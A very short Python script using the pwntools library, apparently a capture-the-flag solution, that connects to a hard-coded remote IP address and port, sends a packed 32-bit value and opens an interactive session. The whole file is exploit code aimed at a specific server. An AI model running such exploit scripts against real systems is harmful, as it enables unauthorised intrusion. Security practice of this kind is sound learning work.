from pwn import *

r = remote('103.77.175.40', 6996 )
payload = p32(0x13141516, endian='big')
r.sendline(payload)
r.interactive()